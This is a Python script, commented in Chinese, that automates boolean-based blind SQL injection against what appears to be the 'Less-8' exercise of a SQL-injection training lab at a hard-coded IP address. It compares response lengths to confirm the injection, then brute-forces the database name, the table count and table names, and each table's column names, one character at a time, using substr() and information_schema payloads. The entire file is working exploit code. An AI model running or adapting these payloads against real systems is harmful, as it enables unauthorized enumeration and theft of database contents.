import requests

base_url = "http://8.137.60.154:8082/Less-8/"

base_str = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
            'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
            'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
            '8', '9', '_', '$', '@', '(', ')', '-', '.', '[', ']', '^',
            '{', '}', '~', '!']

# TODO:payload_1用于显示正常的长度
payload_1 = "?id=1"
response_1 = len(requests.get(base_url + payload_1).text)

# TODO:payload_2用于判断是否存在SQL注入
payload_2 = "?id=1'"
response_2 = len(requests.get(base_url + payload_2).text)

if response_2 != response_1:
    print(f"存在SQL注入！正常长度为: {response_1}, 错误长度为: {response_2}")

    # TODO:猜测数据库名称的长度,假设最长为15
    for dbname_len in range(1, 16):
        payload_3 = f"?id=1' and length(database())={dbname_len}--+"
        if len(requests.get(base_url + payload_3).text) == response_1:
            print(f"-------> 数据库名称长度为: {dbname_len} <-------")

            # TODO:猜测数据库名称
            dbname = ""
            for dbname_index in range(1, dbname_len + 1):
                for dbname_char in base_str:
                    payload_4 = f"?id=1' and substr(database(),{dbname_index},1)='{dbname_char}'--+"
                    if len(requests.get(base_url + payload_4).text) == response_1:
                        dbname += dbname_char
                        print(f"数据库的第{dbname_index}个字符: {dbname}")
                        break

            print(f"-------> 完整数据库名称为: {dbname} <-------")

            # TODO:猜测表的个数,圈定表的个数最大10
            for table_count in range(1, 11):
                payload_5 = f"?id=1' and (select count(*) from information_schema.tables where table_schema=database())={table_count}--+"
                if len(requests.get(base_url + payload_5).text) == response_1:
                    print(f"-------> 数据库中表的个数为: {table_count} <-------")

                    # TODO:猜解所有表名
                    table = []  # 存储所有表名
                    for table_index in range(1, table_count + 1):
                        # TODO:初始化表名
                        table_name = ""

                        # TODO:猜测表名，圈定表的长度最大10,越大速度越慢
                        for i in range(1, 11):
                            for table_char in base_str:
                                payload_6 = f"?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {table_index - 1},1),{i},1)='{table_char}'--+"
                                if len(requests.get(base_url + payload_6).text) == response_1:
                                    table_name += table_char
                                    print(f"表{table_index}的第{i}个字符: {table_char}")
                                    break

                            # 如果没有字符匹配，结束当前表名的猜测
                            if table_char == "":
                                break

                        print(f"-------> 表{table_index}的完整表名为: {table_name} <-------")
                        table.append(table_name)  # 将表名存入列表

                    # TODO:猜解第一张表的字段数
                    for table_name in table:
                        for column_count in range(1, 11):
                            payload_7 = f"?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='{table_name}')={column_count}--+"
                            if len(requests.get(base_url + payload_7).text) == response_1:
                                print(f"-------> 表 {table_name} 的字段个数为: {column_count} <--------")

                                # TODO:猜解字段名
                                for column_index in range(1, column_count + 1):
                                    # TODO:初始化字段名
                                    column_name = ""

                                    # TODO:猜测字段名，圈定字段名的长度最大10
                                    for i in range(1, 11):
                                        for column_char in base_str:
                                            payload_8 = f"?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table_name}' limit {column_index - 1},1),{i},1)='{column_char}'--+"
                                            if len(requests.get(base_url + payload_8).text) == response_1:
                                                column_name += column_char
                                                print(
                                                    f"表 {table_name} 第 {column_index} 个字段的第 {i} 个字符: {column_char}")
                                                break

                                        # 如果没有字符匹配，结束当前字段名的猜测
                                        if column_char == "":
                                            break

                                    print(
                                        f"-------> 表 {table_name} 的字段 {column_index} 的完整字段名为: {column_name} <-------")
                                break
            break
else:
    print("不存在SQL注入或payload不正确！")
